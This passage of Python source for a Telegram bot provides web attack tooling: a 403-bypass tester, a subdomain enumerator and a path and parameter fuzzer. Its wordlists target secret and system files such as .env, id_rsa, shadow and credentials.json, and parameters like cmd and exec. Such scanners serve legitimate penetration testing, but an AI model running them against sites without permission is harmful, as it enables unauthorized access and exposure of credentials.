            if st in (200, 201, 204, 301, 302):
                return True
            # Different size even on 403 might indicate WAF bypass
            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
                return True
        return False

    # ── Header manipulation ──────────────────────────
    for hdr_template in _BYPASS_HEADERS:
        hdrs = {}
        for k, v in hdr_template.items():
            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
        r = _probe(url, hdrs, label=label)
        if r:
            r["technique"] = "header_manipulation"
            results.append(r)

    # ── Path variants ────────────────────────────────
    path_variants = [
        (f"{base}{path}/",                    "path/"),
        (f"{base}{path}//",                   "path//"),
        (f"{base}{path}/.",                   "path/."),
        (f"{base}/{path_clean}%20",           "url_encode_space"),
        (f"{base}/{path_clean}%09",           "url_encode_tab"),
        (f"{base}/{path_clean}%00",           "null_byte"),
        (f"{base}/{path_clean}..;/",          "path_dotdot"),
        (f"{base}/{path_clean};/",            "semicolon"),
        (f"{base}//{path_clean}",             "double_slash"),
        (f"{base}/{path_clean.upper()}",      "uppercase"),
        (f"{base}/{path_clean.lower()}",      "lowercase"),
        (f"{base}/{path_clean}?anything",     "query_append"),
        (f"{base}/{path_clean}#",             "fragment"),
        (f"{base}/./{ path_clean}",           "dot_prefix"),
        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
    ]
    for test_url, label in path_variants:
        safe_ok, _ = is_safe_url(test_url)
        if not safe_ok:
            continue
        r = _probe(test_url, label=label)
        if r:
            r["technique"] = "path_variant"
            results.append(r)

    # ── HTTP method override ─────────────────────────
    for method in _BYPASS_METHODS:
        r = _probe(url, method=method, label=f"Method: {method}")
        if r:
            r["technique"] = "method_override"
            results.append(r)

    # ── Method override via header ───────────────────
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = _probe(url,
                   extra_headers={"X-HTTP-Method-Override": method,
                                  "X-Method-Override": method},
                   label=f"X-HTTP-Method-Override: {method}")
        if r:
            r["technique"] = "method_override_header"
            results.append(r)

    # ── Content-Type tricks ──────────────────────────
    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                   method="POST", label=f"POST Content-Type: {ct}")
        if r:
            r["technique"] = "content_type"
            results.append(r)

    # Tag bypasses
    for res in results:
        res["bypassed"] = _is_bypass(res)

    return results


async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
            "🔓 *Tests 50+ bypass techniques:*\n"
            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
            "  • X-HTTP-Method-Override header\n"
            "  • Content-Type tricks\n"
            "  • URL encoding bypass (%20, %09, %00)\n\n"
            "⚠️ _For authorized security testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔓 *Bypass Testing — `{domain}`*\n"
        f"Path: `{path}`\n\n"
        "Running 50+ bypass techniques...\n⏳",
        parse_mode='Markdown'
    )

    try:
        results = await asyncio.to_thread(_bypass_sync, url)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
    baseline_st = baseline["status"] if baseline else "?"
    bypasses    = [r for r in results if r.get("bypassed")]
    tested      = len(results) - 1   # exclude baseline

    lines = [
        f"🔓 *Bypass Results — `{path}`*",
        f"🌐 `{domain}` | Baseline: `{baseline_st}`",
        f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
    ]

    if not bypasses:
        lines.append("🔒 No bypasses found — endpoint is well-protected.")
    else:
        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
        for b in bypasses[:15]:
            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
            lines.append(
                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
            )
            if b["status"] in (301, 302):
                loc = b.get("headers", {}).get("Location", "")
                if loc:
                    lines.append(f"      → `{loc[:60]}`")

    # ── Summary by technique type ────────────────────
    tech_counts = {}
    for b in bypasses:
        t = b.get("technique", "other")
        tech_counts[t] = tech_counts.get(t, 0) + 1
    if tech_counts:
        lines.append("\n*By technique:*")
        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
            lines.append(f"  • `{t}`: {c}")

    lines.append("\n⚠️ _Authorized testing only._")

    # ── Export JSON if bypasses found ────────────────
    if bypasses:
        import io
        report = json.dumps({
            "url": url, "baseline_status": baseline_st,
            "tested": tested, "bypasses_found": len(bypasses),
            "bypass_details": [{
                "label": b["label"], "method": b["method"],
                "status": b["status"], "size": b["size"],
                "technique": b["technique"],
                "location": b.get("headers",{}).get("Location",""),
            } for b in bypasses],
            "all_results": [{
                "label": r["label"], "method": r["method"],
                "status": r["status"], "size": r["size"],
            } for r in results],
        }, indent=2)
        buf = io.BytesIO(report.encode())
        try:
            await msg.edit_text("\n".join(lines), parse_mode='Markdown')
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=buf,
                filename=f"bypass403_{domain}_{ts}.json",
                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                parse_mode='Markdown'
            )
        except Exception:
            await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')
    else:
        await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 📡  /subdomains — Advanced Subdomain Enumerator
# ══════════════════════════════════════════════════

_SUBDOMAIN_WORDLIST = [
    "www","mail","smtp","pop","imap","ftp","sftp","ssh","vpn","remote",
    "api","api2","api3","dev","dev2","staging","stage","beta","alpha","test",
    "admin","administrator","portal","panel","dashboard","manage","manager",
    "blog","shop","store","pay","payment","billing","invoice","checkout",
    "app","apps","mobile","m","wap","static","assets","cdn","media","img",
    "images","uploads","files","docs","docs2","help","support","kb","wiki",
    "status","monitor","grafana","prometheus","kibana","elastic","jenkins",
    "git","gitlab","github","bitbucket","jira","confluence","redmine",
    "internal","intranet","corp","corporate","private","secure","ssl",
    "login","auth","sso","oauth","id","identity","account","accounts",
    "db","database","mysql","postgres","redis","mongo","memcache","cache",
    "backup","old","legacy","v1","v2","v3","new","next","preview",
    "sandbox","demo","lab","labs","research","data","analytics","stats",
    "mx","mx1","mx2","ns","ns1","ns2","ns3","dns","dns1","dns2",
    "web","web1","web2","web3","server","server1","host","node","node1",
    "cloud","aws","azure","gcp","heroku","k8s","kubernetes","docker",
    "ci","cd","build","deploy","ops","devops","infra","infrastructure",
    "us","eu","asia","uk","au","jp","de","fr","ca","in","br",
    "prod","production","live","uat","qa","qas","rc","release",
    "autodiscover","autoconfig","cpanel","whm","plesk","webmail",
    "forum","forums","community","social","chat","slack","meet",
    "careers","jobs","press","news","events","about","contact",
]

def _subdomains_sync(domain: str, progress_q: list) -> dict:
    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
    found_all    = set()


    # ── Source 1: crt.sh (Certificate Transparency) ─
    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            seen = set()
            for entry in r.json():
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        sub = name.replace(f".{domain}", "").replace(domain, "")
                        if sub and sub not in seen and len(sub) < 60:
                            seen.add(sub)
                            results["crtsh"].append(name)
                            found_all.add(name)
            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
    except Exception as e:
        results["errors"].append(f"crt.sh: {e}")

    # ── Source 2: HackerTarget API (free) ────────────
    progress_q.append("🔍 Querying HackerTarget API...")
    try:
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=12
        )
        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                if "," in line:
                    hostname = line.split(",")[0].strip().lower()
                    if hostname.endswith(f".{domain}"):
                        found_all.add(hostname)
                        results["hackertarget"].append(hostname)
            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
    except Exception as e:
        results["errors"].append(f"HackerTarget: {e}")

    # ── Source 3: DNS Brute-force ────────────────────
    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
    live_subs  = []
    wildcard_ip = None

    # Wildcard detection
    try:
        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
        wildcard_ip = wc_ip
        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
    except socket.gaierror:
        pass

    def _check_sub(word):
        hostname = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            # Filter wildcard
            if wildcard_ip and ip == wildcard_ip:
                return None
            return (hostname, ip)
        except socket.gaierror:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
        done = 0
        for fut in concurrent.futures.as_completed(futs, timeout=45):
            done += 1
            if done % 50 == 0:
                progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
            try:
                res = fut.result(timeout=4)
                if res:
                    hostname, ip = res
                    live_subs.append({"hostname": hostname, "ip": ip})
                    found_all.add(hostname)
            except Exception:
                pass

    results["bruteforce"] = live_subs
    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")

    # ── Deduplicate and resolve all found ────────────
    all_unique = sorted(found_all)
    resolved   = {}
    for h in all_unique[:100]:
        try:
            resolved[h] = socket.gethostbyname(h)
        except Exception:
            resolved[h] = "unresolved"

    results["all_unique"]    = all_unique
    results["resolved"]      = resolved
    results["total_unique"]  = len(all_unique)
    results["wildcard_detected"] = wildcard_ip is not None

    return results


async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/subdomains <domain> — Advanced subdomain enumeration"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/subdomains example.com`\n\n"
            "📡 *3 sources combined:*\n"
            "  ① crt.sh — Certificate Transparency logs (passive)\n"
            "  ② HackerTarget API — public dataset\n"
            f"  ③ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
            "🛡 Wildcard DNS auto-detection & filtering\n"
            "📦 Exports full list as `.txt` + `.json` files",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()

    # Basic domain validation
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF: block private IPs for the apex domain
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
            return
    except socket.gaierror:
        pass  # domain may not have A record — still continue

    msg = await update.effective_message.reply_text(
        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
        f"① crt.sh (CT logs)\n② HackerTarget API\n"
        f"③ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📡 *Enumerating `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    total    = data["total_unique"]
    resolved = data["resolved"]
    crtsh_c  = len(data["crtsh"])
    ht_c     = len(data["hackertarget"])
    bf_c     = len(data["bruteforce"])
    wc       = data["wildcard_detected"]

    lines = [
        f"📡 *Subdomain Enumeration — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🔎 Total unique: `{total}`",
        f"  crt.sh:       `{crtsh_c}`",
        f"  HackerTarget: `{ht_c}`",
        f"  Brute-force:  `{bf_c}` live",
        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
    ]

    # Show top results
    if data["all_unique"]:
        lines.append("*Found Subdomains:*")
        for h in data["all_unique"][:30]:
            ip = resolved.get(h, "?")
            # Flag interesting ones
            flag = ""
            for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
                if keyword in h:
                    flag = " 🔴"
                    break
            lines.append(f"  `{h}` → `{ip}`{flag}")
        if total > 30:
            lines.append(f"  _…and {total-30} more in export file_")

    lines.append("\n📦 _Full list exported below_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export files ──────────────────────────────────
    import io
    txt_content  = "\n".join(
        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
    )
    json_content = json.dumps({
        "domain": raw, "scanned_at": datetime.now().isoformat(),
        "total_unique": total, "wildcard_detected": wc,
        "sources": {"crtsh": crtsh_c, "hackertarget": ht_c, "bruteforce": bf_c},
        "subdomains": [{
            "hostname": h, "ip": resolved.get(h,"?"),
            "interesting": any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))
        } for h in data["all_unique"]],
    }, indent=2)

    import zipfile as _zf2
    zip_buf = io.BytesIO()
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d  = re.sub(r'[^\w\-]', '_', raw)
    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
        zf.writestr("subdomains.txt",  txt_content.encode())
        zf.writestr("subdomains.json", json_content.encode())
        interesting = [h for h in data["all_unique"]
                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))]
        zf.writestr("interesting.txt", "\n".join(interesting).encode())
    zip_buf.seek(0)

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buf,
        filename=f"subdomains_{safe_d}_{ts}.zip",
        caption=(
            f"📡 *Subdomains — `{raw}`*\n"
            f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
# ══════════════════════════════════════════════════

_FUZZ_PATHS = [
    # Hidden admin / debug
    "admin","administrator","admin.php","admin/login","login","login.php",
    "dashboard","panel","control","manage","manager","cpanel","wp-admin",
    "debug","test","testing","dev","development","staging","beta","old",
    # Backup files
    "backup","backup.zip","backup.sql","dump.sql","db.sql","site.zip",
    "index.php.bak","index.html.bak","config.php.bak",".env",".env.bak",
    ".env.example",".env.local",".env.production",
    # Info disclosure
    "info.php","phpinfo.php","server-info","server-status","status",
    "health","ping","version","api/version","build","trace",
    # Source leaks
    ".git","git/config",".svn","web.config",".htaccess","crossdomain.xml",
    "robots.txt","sitemap.xml","humans.txt","security.txt",
    ".well-known/security.txt","readme.md","README.md","CHANGELOG.md",
    # CMS paths
    "wp-login.php","wp-config.php","xmlrpc.php","wp-json",
    "joomla","wp-content/debug.log","config/database.yml",
    "configuration.php","config.php","config.yml","config.json",
    "settings.py","database.yml","credentials.json","secrets.json",
    # API
    "api","api/v1","api/v2","api/v3","api/users","api/admin","graphql",
    "swagger.json","openapi.json","api-docs","redoc","swagger-ui.html",
    # Logs
    "error.log","access.log","debug.log","app.log","laravel.log",
    "storage/logs/laravel.log","logs/error.log","var/log/app.log",
    # Common uploads/files
    "uploads","files","static","assets","media","public",
    "download","downloads","export","exports","report","reports",
    # Framework specific
    "actuator","actuator/health","actuator/env","actuator/mappings",
    "metrics","prometheus","grafana","kibana","phpmyadmin","adminer.php",
    # Common hidden files
    "id_rsa","id_rsa.pub","authorized_keys","known_hosts",
    "passwd","shadow","hosts","resolv.conf",
]

_FUZZ_PARAMS = [
    "id","user","username","email","file","path","page","url","redirect",
    "next","return","callback","debug","test","admin","token","key","secret",
    "cmd","exec","command","query","search","q","type","action","method",
    "format","output","lang","language","locale","theme","template","view",
    "include","require","load","src","source","data","payload","input",
    "name","pass","password","hash","sig","signature","auth","session",
    "api_key","access_token","refresh_token","client_id","client_secret",
]

def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
    """Run path or parameter fuzzing."""
    found    = []

    # ── Baseline: get 404 fingerprint ───────────────
    try:
        r404 = requests.get(
            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
            timeout=6, verify=False, headers=_get_headers(),
            proxies=proxy_manager.get_proxy()
        )
        baseline_status = r404.status_code
        baseline_size   = len(r404.content)
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
    except Exception:
        baseline_status, baseline_size, baseline_hash = 404, 0, ""

    def _is_interesting(r_status, r_size, r_hash):
        """Filter out baseline 404 catch-all responses."""
        if r_status == baseline_status:
            if r_hash and r_hash == baseline_hash:
                return False
            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
                return False
        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)

    def _probe(target_url):
        try:
            r = requests.get(
                target_url, timeout=5, verify=False, headers=_get_headers(),
                allow_redirects=True, stream=True,
                proxies=proxy_manager.get_proxy()
            )
            chunk = b""
            for part in r.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            r.close()
            r_size = int(r.headers.get("Content-Length", len(chunk)))
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_ct   = r.headers.get("Content-Type","")[:30]
            if _is_interesting(r.status_code, r_size, r_hash):
                return {
                    "url":    target_url,
                    "status": r.status_code,
                    "size":   r_size,
                    "ct":     r_ct,
                    "title":  "",
                }
        except Exception:
            pass
        return None

    if mode == "params":
        targets = [f"{base}?{p}=FUZZ" for p in _FUZZ_PARAMS]
    else:
        targets = [f"{base.rstrip('/')}/{p}" for p in _FUZZ_PATHS]

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            if done % 20 == 0:
                progress_q.append(
                    f"🧪 Fuzzing... `{done}/{len(targets)}` tested | `{len(found)}` found"
                )
            try:
                res = fut.result(timeout=8)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x["status"] != 200, x["status"]))
    return found, baseline_status


async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
            "🧪 *Path mode detects:*\n"
            "  • Hidden admin panels & login pages\n"
            "  • Backup & config files (.env, .sql, .bak)\n"
            "  • Debug endpoints & info disclosure\n"
            "  • Framework internals (Actuator, GraphQL...)\n"
            "  • Log files & source leaks\n\n"
            "🔬 *Param mode detects:*\n"
            "  • Active query parameters\n"
            "  • Open redirect parameters\n"
            "  • Debug/admin param flags\n\n"
            "✅ Baseline fingerprinting to eliminate false positives\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    mode = context.args[1].lower() if len(context.args) > 1 and context.args[1].lower() in ('paths','params') else 'paths'

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain   = urlparse(url).hostname
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    wordlist = _FUZZ_PATHS if mode == 'paths' else _FUZZ_PARAMS

    msg = await update.effective_message.reply_text(
        f"🧪 *Fuzzing `{domain}`* [{mode}]\n"
        f"Wordlist: `{len(wordlist)}` entries\n"
        "Baseline fingerprinting active...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🧪 *Fuzzing `{domain}`* [{mode}]\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        found, baseline_st = await asyncio.to_thread(
            _fuzz_sync, base_url if mode == 'paths' else url, mode, progress_q
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    st_icons = {
        200:"✅", 201:"✅", 204:"✅",
        301:"↪️", 302:"↩️", 307:"🔄",
        401:"🔑", 403:"🔒", 500:"💥"
    }
    risk_words = {
        "paths": ['backup','.env','admin','config','debug','.sql','.bak',
                   'password','secret','credential','id_rsa','passwd','shadow',
                   'actuator','phpinfo','phpmyadmin','adminer'],
        "params": ['cmd','exec','command','file','path','url','redirect',
                   'include','require','load','src'],
    }

    lines = [
        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
        f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
    ]

    if not found:
        lines.append("🔒 Nothing found — well hardened!")
    else:
        # Categorize
        critical = [r for r in found if r["status"] == 200 and
                    any(w in r["url"].lower() for w in risk_words.get(mode, []))]
        normal   = [r for r in found if r not in critical]

        if critical:
            lines.append(f"*🔴 High-Risk ({len(critical)}):*")
            for item in critical[:10]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            lines.append("")

        if normal:
            lines.append(f"*🟡 Interesting ({len(normal)}):*")
            for item in normal[:20]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            if len(normal) > 20:
                lines.append(f"  _…{len(normal)-20} more in report_")

    lines.append("\n⚠️ _Passive fuzzing. No exploitation._")

    # ── Always export JSON report ──────────────────
    import io as _io
    report = json.dumps({
        "target": url, "mode": mode, "domain": domain,
        "scanned_at": datetime.now().isoformat(),
        "baseline_status": baseline_st,
        "wordlist_size": len(wordlist),
        "findings_count": len(found),
        "findings": [{
            "url":    r["url"],
            "path":   r["url"].replace(base_url,""),
            "status": r["status"],
            "size":   r["size"],
            "content_type": r["ct"],
            "high_risk": any(w in r["url"].lower() for w in risk_words.get(mode,[])),
        } for r in found],
    }, indent=2)

    tg_text = "\n".join(lines)
    try:
        await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
    except Exception:
        pass

    buf = _io.BytesIO(report.encode())
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=buf,
        filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
        caption=(
            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
            f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
            f"Wordlist: `{len(wordlist)}` entries"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
# ══════════════════════════════════════════════════
# DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
# Admin IDs always bypass — no check needed.

async def _get_force_channels(db: dict) -> list:
    return db.get("settings", {}).get("force_channels", [])

async def check_force_join(update: Update, context) -> bool:
    """
    Returns True if user is allowed to proceed.
    Admin always passes. Regular users must be member of all force channels.
    """
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True  # Admin — always free

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)
    if not channels:
        return True  # No force join configured — allow all

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        return True

    # Build join buttons
    kb = []
    for ch in not_joined:
        label = ch if ch.startswith('@') else f"Channel"
        invite_link = ch if ch.startswith('@') else ch
        kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])

    await update.effective_message.reply_text(
        "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
        "အောက်ပါ Channel(s) ကို Join ပြီးမှ ဆက်လုပ်ပါ:\n\n"
        + "\n".join(f"  • {ch}" for ch in not_joined),
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode='Markdown'
    )
    return False


async def force_join_callback(update: Update, context) -> None:
    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        try:
            await query.edit_message_text(
                "✅ *စစ်ဆေးမှု အောင်မြင်ပါပြီ!*\n\n"
                "Bot ကို အခုသုံးလို့ ရပါပြီ 🎉\n"
                "/start ကို နှိပ်ပါ",
                parse_mode='Markdown'
            )
        except BadRequest:
            pass  # Message already same content — ignore
    else:
        kb = []
        for ch in not_joined:
            kb.append([InlineKeyboardButton(
                f"📢 {ch} ကို Join လုပ်ပါ",
                url=f"https://t.me/{ch.lstrip('@')}"
            )])
        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
        new_text = (
            "❌ *မပြည့်စုံသေးပါ*\n\n"
            "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
            + "\n".join(f"  • {ch}" for ch in not_joined)
        )
        try:
            await query.edit_message_text(
                new_text,
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode='Markdown'
            )
        except BadRequest:
            # Message not modified (same channels) — just answer silently
            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)


async def appassets_cat_callback(update: Update, context) -> None:
    """Callback for /appassets category selection buttons."""
    query = update.callback_query
    await query.answer()
    uid  = query.from_user.id
    data = query.data  # apa_images / apa_all / etc.

    cat = data[4:]  # strip "apa_"
    valid_cats = set(_ASSET_CATEGORIES.keys())

    if cat == "all":
        wanted_cats = valid_cats.copy()
    elif cat in valid_cats:
        wanted_cats = {cat}
    else:
        try: await query.edit_message_text("❌ Unknown category")
        except BadRequest: pass
        return

    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        try:
            await query.edit_message_text(
                "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
            )
        except BadRequest: pass
        return

    try:
        await query.edit_message_text(
            f"📦 Extracting `{', '.join(sorted(wanted_cats))}` from "
            f"`{os.path.basename(last_app)}`...\n⏳"
        )
    except BadRequest:
        pass

    # Use query.message as message target — send new reply
    await _do_appassets_extract(query.message, context, last_app, wanted_cats)


@admin_only
async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setforcejoin @channel1 @channel2 ... | /setforcejoin off"""
    if not context.args:
        async with db_lock:
            db = _load_db_sync()
        chs = await _get_force_channels(db)
        await update.effective_message.reply_text(
            "📢 *Force Join Settings*\n\n"
            f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
            "Usage:\n"
            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
            "`/setforcejoin off` — ပိတ်မည်\n\n"
            "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
            parse_mode='Markdown'
        )
        return

